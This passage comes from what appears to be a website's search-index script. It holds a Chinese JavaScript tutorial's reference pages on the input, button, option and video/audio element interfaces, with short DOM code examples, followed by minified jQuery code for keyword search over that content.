<ul>\n<li><code>focus()</code>：当前<code>&lt;input&gt;</code>元素获得焦点。</li>\n<li><code>blur()</code>：移除<code>&lt;input&gt;</code>元素的焦点。</li>\n<li><code>select()</code>：选中<code>&lt;input&gt;</code>元素内部的所有文本。该方法不能保证<code>&lt;input&gt;</code>获得焦点，最好先用<code>focus()</code>方法，再用这个方法。</li>\n<li><code>click()</code>：模拟鼠标点击当前的<code>&lt;input&gt;</code>元素。</li>\n<li><code>setSelectionRange()</code>：选中<code>&lt;input&gt;</code>元素内部的一段文本，但不会将焦点转移到选中的文本。该方法接受三个参数，第一个参数是开始的位置（从0开始），第二个参数是结束的位置（不包括该位置），第三个参数是可选的，表示选择的方向，有三个可能的值（<code>forward</code>、<code>backward</code>和默认值<code>none</code>）。</li>\n<li><code>setRangeText()</code>：新文本替换选中的文本。该方法接受四个参数，第一个参数是新文本，第二个参数是替换的开始位置，第三个参数是结束位置，第四个参数表示替换后的行为（可选），有四个可能的值：<code>select</code>（选中新插入的文本）、<code>start</code>（选中的开始位置移到插入的文本之前）、<code>end</code>（选中的文本移到插入的文本之后）、<code>preserve</code>（保留原先选中的位置，默认值）。</li>\n<li><code>setCustomValidity()</code>：该方法调用后，会提示用户校验失败。它的参数就是报错的提示信息。</li>\n<li><code>checkValidity()</code>：返回一个布尔值，表示当前节点的校验结果。如果返回<code>false</code>，表示不满足校验要求，否则就是校验成功或不必校验。</li>\n<li><code>stepDown()</code>：将当前<code>&lt;input&gt;</code>节点的值减少一个步长。该方法可以接受一个整数<code>n</code>作为参数，表示一次性减少<code>n</code>个步长，默认是<code>1</code>。有几种情况会抛错：当前<code>&lt;input&gt;</code>节点不适合递减或递增、当前节点没有<code>step</code>属性、<code>&lt;input&gt;</code>节点的值不能转为数字、递减之后的值小于<code>min</code>属性或大于<code>max</code>属性。</li>\n<li><code>stepUp()</code>：将当前<code>&lt;input&gt;</code>节点的值增加一个步长。其他与<code>stepDown()</code>方法相同。</li>\n</ul>\n<p>下面是<code>setSelectionRange()</code>方法的一个例子。</p>\n<pre class=\"prettyprint language-javascript\"><code>/* HTML 代码如下\n  &lt;p&gt;&lt;input type=&quot;text&quot; id=&quot;mytextbox&quot; size=&quot;20&quot; value=&quot;HelloWorld&quot;/&gt;&lt;/p&gt;\n  &lt;p&gt;&lt;button onclick=&quot;SelectText()&quot;&gt;选择文本&lt;/button&gt;&lt;/p&gt;\n*/\n\nfunction SelectText() {\n  var input = document.getElementById(&#039;mytextbox&#039;);\n  input.focus();\n  input.setSelectionRange(2, 5);\n}</code></pre><p>上面代码中，点击按钮以后，会选中<code>llo</code>三个字符。</p>\n"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"附录：网页元素接口","link":"javascript:void(0)"},{"title":"button 元素","link":"/elements/button.html"}],"content":"\n        <h1>\n            <a href='#button-元素' class='header-anchor'>#</a>\n            <span>button 元素</span>\n        </h1>\n    <p><code>&lt;button&gt;</code>元素继承了<code>HTMLButtonElement</code>接口。它有以下的实例属性。</p>\n<p><strong>（1）HTMLButtonElement.accessKey</strong></p>\n<p><code>HTMLButtonElement.accessKey</code>属性返回一个字符串，表示键盘上对应的键，通过<code>Alt + 这个键</code>可以让按钮获得焦点。该属性可读写。</p>\n<p><strong>（2）HTMLButtonElement.autofocus</strong></p>\n<p><code>HTMLButtonElement.autofocus</code>属性是一个布尔值，表示页面加载过程中，按钮是否会自动获得焦点。该属性可读写。</p>\n<p><strong>（3）HTMLButtonElement.disabled</strong></p>\n<p><code>HTMLButtonElement.disabled</code>属性是一个布尔值，表示该按钮是否禁止点击。该属性可读写。</p>\n<p><strong>（4）HTMLButtonElement.form</strong></p>\n<p><code>HTMLButtonElement.form</code>属性是一个表单元素，返回该按钮所在的表单。该属性只读。如果按钮不属于任何表单，该属性返回<code>null</code>。</p>\n<p><strong>（5）HTMLButtonElement.formAction</strong></p>\n<p><code>HTMLButtonElement.formAction</code>返回一个字符串，表示表单提交的 URL。该属性可读写，一旦设置了值，点击按钮就会提交到该属性指定的 URL，而不是<code>&lt;form&gt;</code>元素指定的 URL。</p>\n<p><strong>（6）HTMLButtonElement.formEnctype</strong></p>\n<p><code>HTMLButtonElement.formEnctype</code>属性是一个字符串，表示数据提交到服务器的编码类型。该属性可读写，一旦设置了值，点击按钮会按照该属性指定的编码方式，而不是<code>&lt;form&gt;</code>元素指定的编码方式。</p>\n<p>该属性可以取以下的值。</p>\n<ul>\n<li><code>application/x-www-form-urlencoded</code>（默认值）</li>\n<li><code>multipart/form-data</code>（上传文件的编码方式）</li>\n<li><code>text/plain</code></li>\n</ul>\n<p><strong>（7）HTMLButtonElement.formMethod</strong></p>\n<p><code>HTMLButtonElement.formMethod</code>属性是一个字符串，表示浏览器提交表单的 HTTP 方法。该属性可读写，一旦设置了值，点击后就会采用该属性指定的 HTTP 方法，而不是<code>&lt;form&gt;</code>元素指定的编码方法。</p>\n<p><strong>（8）HTMLButtonElement.formNoValidate</strong></p>\n<p><code>HTMLButtonElement.formNoValidate</code>属性是一个布尔值，表示点击按钮提交表单时，是否要跳过表单校验的步骤。该属性可读写，一旦设置会覆盖<code>&lt;form&gt;</code>元素的<code>novalidate</code>属性。</p>\n<p><strong>（9）HTMLButtonElement.formTarget</strong></p>\n<p><code>HTMLButtonElement.formTarget</code>属性是一个字符串，指定了提交了表单以后，哪个窗口展示服务器返回的内容。该属性可读写，一旦设置会覆盖<code>&lt;form&gt;</code>元素的<code>target</code>属性。</p>\n<p><strong>（10）HTMLButtonElement.labels</strong></p>\n<p><code>HTMLButtonElement.labels</code>返回<code>NodeList</code>实例，表示那些绑定按钮的<code>&lt;label&gt;</code>元素。该属性只读。</p>\n<pre class=\"prettyprint language-javascript\"><code>/* HTML 代码如下\n  &lt;label id=&quot;label1&quot; for=&quot;test&quot;&gt;Label 1&lt;/label&gt;\n  &lt;button id=&quot;test&quot;&gt;Button&lt;/button&gt;\n  &lt;label id=&quot;label2&quot; for=&quot;test&quot;&gt;Label 2&lt;/label&gt;\n*/\n\nconst button = document.getElementById(&#039;test&#039;);\n\nfor(var i = 0; i &lt; button.labels.length; i++) {\n  console.log(button.labels[i].textContent);\n}\n// &quot;Label 1&quot;\n// &quot;Label 2&quot;</code></pre><p>上面代码中，两个<code>&lt;label&gt;</code>元素绑定<code>&lt;button&gt;</code>元素。<code>button.labels</code>返回这两个<code>&lt;label&gt;</code>元素。</p>\n<p><strong>（11）HTMLButtonElement.name</strong></p>\n<p><code>HTMLButtonElement.name</code>属性是一个字符串，表示按钮元素的<code>name</code>属性。如果没有设置<code>name</code>属性，则返回空字符串。该属性可读写。</p>\n<p><strong>（12）HTMLButtonElement.tabIndex</strong></p>\n<p><code>HTMLButtonElement.tabIndex</code>是一个整数，代表按钮元素的 Tab 键顺序。该属性可读写。</p>\n<p><strong>（13）HTMLButtonElement.type</strong></p>\n<p><code>HTMLButtonElement.type</code>属性是一个字符串，表示按钮的行为。该属性可读写，可能取以下的值。</p>\n<ul>\n<li><code>submit</code>：默认值，表示提交表单。</li>\n<li><code>reset</code>：重置表单。</li>\n<li><code>button</code>：没有任何默认行为。</li>\n</ul>\n<p><strong>（14）HTMLButtonElement.validationMessage</strong></p>\n<p><code>HTMLButtonElement.validationMessage</code>属性是一个字符串，表示没有通过校验时显示的提示信息。该属性只读。</p>\n<p><strong>（15）HTMLButtonElement.validity</strong></p>\n<p><code>HTMLButtonElement.validity</code>属性返回该按钮的校验状态（<code>ValidityState</code>）。该属性只读。</p>\n<p><strong>（16）HTMLButtonElement.value</strong></p>\n<p><code>HTMLButtonElement.value</code>属性返回该按钮绑定的值。该属性可读写。</p>\n<p><strong>（17）HTMLButtonElement.willValidate</strong></p>\n<p><code>HTMLButtonElement.willValidate</code>属性是一个布尔值，表示该按钮提交表单时是否将被校验，默认为<code>false</code>。该属性只读。</p>\n"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"附录：网页元素接口","link":"javascript:void(0)"},{"title":"option 元素","link":"/elements/option.html"}],"content":"\n        <h1>\n            <a href='#option-元素' class='header-anchor'>#</a>\n            <span>option 元素</span>\n        </h1>\n    <p><code>&lt;option&gt;</code>元素表示下拉框（<code>&lt;select&gt;</code>，<code>&lt;optgroup&gt;</code>或<code>&lt;datalist&gt;</code>）里面的一个选项。它是 HTMLOptionElement 接口的实例。</p>\n\n        <h2>\n            <a href='#属性' class='header-anchor'>#</a>\n            <span>属性</span>\n        </h2>\n    <p>除了继承 HTMLElement 接口的属性和方法，HTMLOptionElement 接口具有下面的属性。</p>\n<ul>\n<li><code>disabled</code>：布尔值，表示该项是否可选择。</li>\n<li><code>defaultSelected</code>：布尔值，表示该项是否默认选中。一旦设为<code>true</code>，该项的值就是<code>&lt;select&gt;</code>的默认值。</li>\n<li><code>form</code>：返回<code>&lt;option&gt;</code>所在的表单元素。如果不属于任何表单，则返回<code>null</code>。该属性只读。</li>\n<li><code>index</code>：整数，表示该选项在整个下拉列表里面的位置。该属性只读。</li>\n<li><code>label</code>：字符串，表示对该选项的说明。如果该属性未设置，则返回该选项的文本内容。</li>\n<li><code>selected</code>：布尔值，表示该选项是否选中。</li>\n<li><code>text</code>：字符串，该选项的文本内容。</li>\n<li><code>value</code>：字符串，该选项的值。表单提交时，上传的就是选中项的这个属性。</li>\n</ul>\n\n        <h2>\n            <a href='#Option()-构造函数' class='header-anchor'>#</a>\n            <span>Option() 构造函数</span>\n        </h2>\n    <p>浏览器原生提供<code>Option()</code>构造函数，用来生成 HTMLOptionElement 实例。</p>\n<pre class=\"prettyprint language-javascript\"><code>new Option(text, value, defaultSelected, selected)</code></pre><p>它接受四个参数，都是可选的。</p>\n<ul>\n<li>text：字符串，表示该选项的文本内容。如果省略，返回空字符串。</li>\n<li>value：字符串，表示该选项的值。如果省略，默认返回<code>text</code>属性的值。</li>\n<li>defaultSelected：布尔值，表示该项是否默认选中，默认为<code>false</code>。注意，即使设为<code>true</code>，也不代表该项的<code>selected</code>属性为<code>true</code>。</li>\n<li>selected：布尔值，表示该项是否选中，默认为<code>false</code>。</li>\n</ul>\n<pre class=\"prettyprint language-javascript\"><code>var newOption = new Option(&#039;hello&#039;, &#039;world&#039;, true);\n\nnewOption.text // &quot;hello&quot;\nnewOption.value // &quot;world&quot;\nnewOption.defaultSelected // true\nnewOption.selected // false</code></pre><p>上面代码中，<code>newOption</code>的<code>defaultSelected</code>属性为<code>true</code>，但是它没有被选中（即<code>selected</code>属性为<code>false</code>）。</p>\n"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"附录：网页元素接口","link":"javascript:void(0)"},{"title":"video，audio","link":"/elements/video.html"}],"content":"\n        <h1>\n            <a href='#video，audio' class='header-anchor'>#</a>\n            <span>video，audio</span>\n        </h1>\n    \n        <h2>\n            <a href='#概述' class='header-anchor'>#</a>\n            <span>概述</span>\n        </h2>\n    <p><code>&lt;video&gt;</code>元素用来加载视频，是<code>HTMLVideoElement</code>对象的实例。<code>&lt;audio&gt;</code>元素用来加载音频，是<code>HTMLAudioElement</code>对象的实例。而<code>HTMLVideoElement</code>和<code>HTMLAudioElement</code>都继承了<code>HTMLMediaElement</code>，所以这两个 HTML 元素有许多共同的属性和方法，可以放在一起介绍。</p>\n<p>理论上，这两个 HTML 元素直接用<code>src</code>属性指定媒体文件，就可以使用了。</p>\n<pre class=\"prettyprint language-html\"><code>&lt;audio src=&quot;background_music.mp3&quot;/&gt;\n&lt;video src=&quot;news.mov&quot; width=320 height=240/&gt;</code></pre><p>注意，<code>&lt;video&gt;</code>元素有<code>width</code>属性和<code>height</code>属性，可以指定宽和高。<code>&lt;audio&gt;</code>元素没有这两个属性，因为它的播放器外形是浏览器给定的，不能指定。</p>\n<p>实际上，不同的浏览器支持不同的媒体格式，我们不得不用<code>&lt;source&gt;</code>元素指定同一个媒体文件的不同格式。</p>\n<pre class=\"prettyprint language-html\"><code>&lt;audio id=&quot;music&quot;&gt;\n  &lt;source src=&quot;music.mp3&quot; type=&quot;audio/mpeg&quot;&gt;  \n  &lt;source src=&quot;music.ogg&quot; type=&#039;audio/ogg; codec=&quot;vorbis&quot;&#039;&gt;\n&lt;/audio&gt;</code></pre><p>浏览器遇到支持的格式，就会忽略后面的格式。</p>\n<p>这两个元素都有一个<code>controls</code>属性，只有打开这个属性，才会显示控制条。注意，<code>&lt;audio&gt;</code>元素如果不打开<code>controls</code>属性，根本不会显示，而是直接在背景播放。</p>\n\n        <h2>\n            <a href='#HTMLMediaElement-接口' class='header-anchor'>#</a>\n            <span>HTMLMediaElement 接口</span>\n        </h2>\n    <p><code>HTMLMediaElement</code>并没有对应的 HTML 元素，而是作为<code>&lt;video&gt;</code>和<code>&lt;audio&gt;</code>的基类，定义一些它们共同的属性和方法。</p>\n<p><code>HTMLMediaElement</code>接口有以下属性。</p>\n<ul>\n<li>HTMLMediaElement.audioTracks：返回一个类似数组的对象，表示媒体文件包含的音轨。</li>\n<li>HTMLMediaElement.autoplay：布尔值，表示媒体文件是否自动播放，对应 HTML 属性<code>autoplay</code>。</li>\n<li>HTMLMediaElement.buffered：返回一个 TimeRanges 对象，表示浏览器缓冲的内容。该对象的<code>length</code>属性返回缓存里面有多少段内容，<code>start(rangeId)</code>方法返回指定的某段内容（从0开始）开始的时间点，<code>end()</code>返回指定的某段内容结束的时间点。该属性只读。</li>\n<li>HTMLMediaElement.controls：布尔值，表示是否显示媒体文件的控制栏，对应 HTML 属性<code>autoplay</code>。</li>\n<li>HTMLMediaElement.controlsList：返回一个类似数组的对象，表示是否显示控制栏的某些控件。该对象包含三个可能的值：<code>nodownload</code>、<code>nofullscreen</code>和<code>noremoteplayback</code>。该属性只读。</li>\n<li>HTMLMediaElement.crossOrigin：字符串，表示跨域请求时是否附带用户信息（比如 Cookie），对应 HTML 属性<code>crossorigin</code>。该属性只有两个可能的值：<code>anonymous</code>和<code>use-credentials</code>。</li>\n<li>HTMLMediaElement.currentSrc：字符串，表示当前正在播放的媒体文件的绝对路径。该属性只读。</li>\n<li>HTMLMediaElement.currentTime：浮点数，表示当前播放的时间点。</li>\n<li>HTMLMediaElement.defaultMuted：布尔值，表示默认是否关闭音量，对应 HTML 属性<code>muted</code>。</li>\n<li>HTMLMediaElement.defaultPlaybackRate：浮点数，表示默认的播放速率，默认是1.0。</li>\n<li>HTMLMediaElement.disableRemotePlayback：布尔值，是否允许远程回放，即远程回放的时候是否会有工具栏。</li>\n<li>HTMLMediaElement.duration：浮点数，表示媒体文件的时间长度（单位秒）。如果当前没有媒体文件，该属性返回0。该属性只读。</li>\n<li>HTMLMediaElement.ended：布尔值，表示当前媒体文件是否已经播放结束。该属性只读。</li>\n<li>HTMLMediaElement.error：返回最近一次报错的错误对象，如果没有报错，返回<code>null</code>。</li>\n<li>HTMLMediaElement.loop：布尔值，表示媒体文件是否会循环播放，对应 HTML 属性<code>loop</code>。</li>\n<li>HTMLMediaElement.muted：布尔值，表示音量是否关闭。</li>\n<li>HTMLMediaElement.networkState：当前网络状态，共有四个可能的值。0表示没有数据；1表示媒体元素处在激活状态，但是还没开始下载；2表示下载中；3表示没有找到媒体文件。</li>\n<li>HTMLMediaElement.paused：布尔值，表示媒体文件是否处在暂停状态。该属性只读。</li>\n<li>HTMLMediaElement.playbackRate：浮点数，表示媒体文件的播放速度，1.0是正常速度。如果是负数，表示向后播放。</li>\n<li>HTMLMediaElement.played：返回一个 TimeRanges 对象，表示播放的媒体内容。该属性只读。</li>\n<li>HTMLMediaElement.preload：字符串，表示应该预加载哪些内容，可能的值为<code>none</code>、<code>metadata</code>和<code>auto</code>。</li>\n<li>HTMLMediaElement.readyState：整数，表示媒体文件的准备状态，可能的值为0（没有任何数据）、1（已获取元数据）、2（可播放当前帧，但不足以播放多个帧）、3（可以播放多帧，至少为两帧）、4（可以流畅播放）。该属性只读。</li>\n<li>HTMLMediaElement.seekable：返回一个 TimeRanges 对象，表示一个用户可以搜索的媒体内容范围。该属性只读。</li>\n<li>HTMLMediaElement.seeking：布尔值，表示媒体文件是否正在寻找新位置。该属性只读。</li>\n<li>HTMLMediaElement.src：布尔值，表示媒体文件的 URL，对应 HTML 属性<code>src</code>。</li>\n<li>HTMLMediaElement.srcObject：返回<code>src</code>属性对应的媒体文件资源，可能是<code>MediaStream</code>、<code>MediaSource</code>、<code>Blob</code>或<code>File</code>对象。直接指定这个属性，就可以播放媒体文件。</li>\n<li>HTMLMediaElement.textTracks：返回一个类似数组的对象，包含所有文本轨道。该属性只读。</li>\n<li>HTMLMediaElement.videoTracks：返回一个类似数组的对象，包含多有视频轨道。该属性只读。</li>\n<li>HTMLMediaElement.volume：浮点数，表示音量。0.0 表示静音，1.0 表示最大音量。</li>\n</ul>\n<p><code>HTMLMediaElement</code>接口有如下方法。</p>\n<ul>\n<li>HTMLMediaElement.addTextTrack()：添加文本轨道（比如字幕）到媒体文件。</li>\n<li>HTMLMediaElement.captureStream()：返回一个 MediaStream 对象，用来捕获当前媒体文件的流内容。</li>\n<li>HTMLMediaElement.canPlayType()：该方法接受一个 MIME 字符串作为参数，用来判断这种类型的媒体文件是否可以播放。该反复返回一个字符串，有三种可能的值，<code>probably</code>表示似乎可播放，<code>maybe</code>表示无法在不播放的情况下判断是否可播放，空字符串表示无法播放。</li>\n<li>HTMLMediaElement.fastSeek()：该方法接受一个浮点数作为参数，表示指定的时间（单位秒）。该方法将媒体文件移动到指定时间。</li>\n<li>HTMLMediaElement.load()：重新加载媒体文件。</li>\n<li>HTMLMediaElement.pause()：暂停播放。该方法没有返回值。</li>\n<li>HTMLMediaElement.play()：开始播放。该方法返回一个 Promise 对象。</li>\n</ul>\n<p>下面是<code>play()</code>方法的一个例子。</p>\n<pre class=\"prettyprint language-javascript\"><code>var myVideo = document.getElementById(&#039;myVideoElement&#039;);\n\nmyVideo\n.play()\n.then(() =&gt; {\n  console.log(&#039;playing&#039;);\n})\n.catch((error) =&gt; {\n  console.log(error);\n});</code></pre>\n        <h2>\n            <a href='#HTMLVideoElement-接口' class='header-anchor'>#</a>\n            <span>HTMLVideoElement 接口</span>\n        </h2>\n    <p><code>HTMLVideoElement</code>接口代表了<code>&lt;video&gt;</code>元素。这个接口继承了<code>HTMLMediaElement</code>接口，并且有一些自己的属性和方法。</p>\n<p>HTMLVideoElement 接口的属性。</p>\n<ul>\n<li>HTMLVideoElement.height：字符串，表示视频播放区域的高度（单位像素），对应 HTML 属性<code>height</code>。</li>\n<li>HTMLVideoElement.width：字符串，表示视频播放区域的宽度（单位像素），对应 HTML 属性<code>width</code>。</li>\n<li>HTMLVideoElement.videoHeight：该属性只读，返回一个整数，表示视频文件自身的高度（单位像素）。</li>\n<li>HTMLVideoElement.videoWidth：该属性只读，返回一个整数，表示视频文件自身的宽度（单位像素）。</li>\n<li>HTMLVideoElement.poster：字符串，表示一个图像文件的 URL，用来在无法获取视频文件时替代显示，对应 HTML 属性<code>poster</code>。</li>\n</ul>\n<p>HTMLVideoElement 接口的方法。</p>\n<ul>\n<li>HTMLVideoElement.getVideoPlaybackQuality()：返回一个对象，包含了当前视频回访的一些数据。</li>\n</ul>\n\n        <h2>\n            <a href='#HTMLAudioElement-接口' class='header-anchor'>#</a>\n            <span>HTMLAudioElement 接口</span>\n        </h2>\n    <p><code>HTMLAudioElement</code>接口代表了<code>&lt;audio&gt;</code>元素。</p>\n<p>该接口继承了<code>HTMLMediaElement</code>，但是没有定义自己的属性和方法。浏览器原生提供一个<code>Audio()</code>构造函数，返回的就是<code>HTMLAudioElement</code>实例。</p>\n<pre class=\"prettyprint language-javascript\"><code>var song = new Audio([URLString]);</code></pre><p><code>Audio()</code>构造函数接受一个字符串作为参数，表示媒体文件的 URL。如果省略这个参数，可以稍后通过<code>src</code>属性指定。</p>\n<p>生成<code>HTMLAudioElement</code>实例以后，不用插入 DOM，可以直接用<code>play()</code>方法在背景播放。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = new Audio();\nif (a.canPlayType(&#039;audio/wav&#039;)) {\n  a.src = &#039;soundeffect.wav&#039;;\n  a.play();\n}</code></pre>\n        <h2>\n            <a href='#事件' class='header-anchor'>#</a>\n            <span>事件</span>\n        </h2>\n    <p><code>&lt;video&gt;</code>和<code>&lt;audio&gt;</code>元素有以下事件。</p>\n<ul>\n<li>loadstart：开始加载媒体文件时触发。    </li>\n<li>progress：媒体文件加载过程中触发，大概是每秒触发2到8次。    </li>\n<li>loadedmetadata：媒体文件元数据加载成功时触发。    </li>\n<li>loadeddata：当前播放位置加载成功后触发。    </li>\n<li>canplay：已经加载了足够的数据，可以开始播放时触发，后面可能还会请求数据。    </li>\n<li>canplaythrough：已经加载了足够的数据，可以一直播放时触发，后面不需要继续请求数据。    </li>\n<li>suspend：已经缓冲了足够的数据，暂时停止下载时触发。    </li>\n<li>stalled：尝试加载数据，但是没有数据返回时触发。    </li>\n<li>play：调用<code>play()</code>方法时或自动播放启动时触发。如果已经加载了足够的数据，这个事件后面会紧跟<code>playing</code>事件，否则会触发<code>waiting</code>事件。</li>\n<li>waiting：由于没有足够的缓存数据，无法播放或播放停止时触发。一旦缓冲数据足够开始播放，后面就会紧跟<code>playing</code>事件。</li>\n<li>playing：媒体开始播放时触发。</li>\n<li>timeupdate：<code>currentTime</code>属性变化时触发，每秒可能触发4到60次。</li>\n<li>pause：调用<code>pause()</code>方法、播放暂停时触发。</li>\n<li>seeking：脚本或者用户要求播放某个没有缓冲的位置，播放停止开始加载数据时触发。此时，<code>seeking</code>属性返回<code>true</code>。</li>\n<li>seeked：<code>seeking</code>属性变回<code>false</code>时触发。    </li>\n<li>ended：媒体文件播放完毕时触发。</li>\n<li>durationchange：<code>duration</code>属性变化时触发。</li>\n<li>volumechange：音量变回或者静音时触发。    </li>\n<li>ratechange：播放速度或默认的播放速度变化时触发。    </li>\n<li>abort：停止加载媒体文件时触发，通常是用户主动要求停止下载。    </li>\n<li>error：网络或其他原因导致媒体文件无法加载时触发。    </li>\n<li>emptied：由于<code>error</code>或<code>abort</code>事件导致<code>networkState</code>属性变成无法获取数据时触发。</li>\n</ul>\n"}];var randStr=function(){return Math.random().toString(36).substr(2);};var findTitle=function(ele){var findPrevs=function(ele){var children=$(ele).parent().children();var prevs=[];var findIt=false;children=Array.prototype.slice.call(children);children.forEach(function(subEle){if($(subEle).is($(ele))){findIt=true;}if(findIt===false&&$(subEle).text()!=""){prevs.push(subEle);}});return prevs;};var findH=function(eles){var _eles=Array.prototype.slice.call(eles);_eles.reverse();var title="";var id="";_eles.forEach(function(item){if(!title){if(item.nodeName[0]==="H"){title=$(item).text();id=$(item).attr("id");}}});return{text:title,id:id};};var prevs=findPrevs(ele);if(prevs.length){return findH(prevs);}};window.searchData=function(keyword){var searchResult=[];content.forEach(function(item){var tempHtml="<div id='"+randStr()+"'></div>";var tempEle=$(tempHtml);var findArray=[];tempEle.html(item.content);findArray=tempEle.find(":contains('"+keyword+"')");findArray=Array.prototype.slice.call(findArray);if(findArray.length){findArray.forEach(function(ele){var findContent=$(ele).text();findContent=findContent[0]==="<"?$(findContent).text():findContent;findContent=findContent.replace(new RegExp(keyword,'g'),"<b>"+keyword+"</b>");var hObj=findTitle(ele);if(hObj){searchResult.push({context:item.context,title:hObj.text,hid:hObj.id,findContent:findContent});}});}});return searchResult;};})();